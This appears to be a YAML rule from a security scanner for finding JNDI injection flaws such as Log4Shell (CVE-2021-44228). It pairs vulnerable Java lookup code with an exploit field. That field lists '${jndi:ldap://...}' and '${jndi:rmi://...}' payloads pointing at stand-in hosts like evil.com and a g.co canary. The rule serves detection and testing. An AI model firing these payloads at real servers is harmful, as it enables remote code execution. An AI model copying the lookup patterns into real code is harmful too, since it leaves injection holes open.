description: |-
  JNDI lookups performed with user-controlled URLs like Log4Shell (CVE-2021-44228), which lead to remote code execution through malicious LDAP servers or RMI registries, especially in combination with expression injection.

  Find: Context.lookup() using user input, including lookupLink and different context types.
  ```java
  // Direct JNDI lookup
  String userInput = request.getParameter("name");
  Context ctx = new InitialContext();
  Object obj = ctx.lookup(userInput);  // Vulnerable to injection

  // Dynamic service lookup
  String serviceName = getServiceName();  // From untrusted source
  Service service = (Service) context.lookup("ldap://" + serviceName);  // Vulnerable with LDAP
  RemoteService remote = (RemoteService) ctx.lookup("rmi://" + serviceName);  // Vulnerable with RMI

  // Nested in expressions
  String expr = "${jndi:" + userInput + "}";  // BUG: expression language

  // Log4j vulnerability (CVE-2021-44228)
  String userInput = "${jndi:ldap://malicious.com/exploit}";  // LDAP variant
  String rmiInput = "${jndi:rmi://evil.com/exploit}";         // RMI variant
  logger.error("User input: {}", userInput);  // Vulnerable to Log4Shell
  ```

exploit: |-
  1. Locate JNDI lookup with user input
  2. Use EXACT JNDI URL patterns

  ```java
  Context ctx = new InitialContext();

  // Basic lookups - both protocols work
  ctx.lookup("ldap://g.co/");      // Using LDAP
  ctx.lookup("rmi://g.co/");       // Using RMI

  // With lookupLink - both protocols work
  ctx.lookupLink("ldap://g.co/");  // Using LDAP
  ctx.lookupLink("rmi://g.co/");   // Using RMI

  // Log4j patterns - both protocols work
  logger.info("${jndi:ldap://g.co/}");  // LDAP variant
  logger.error("${jndi:rmi://g.co/}");  // RMI variant
  ```
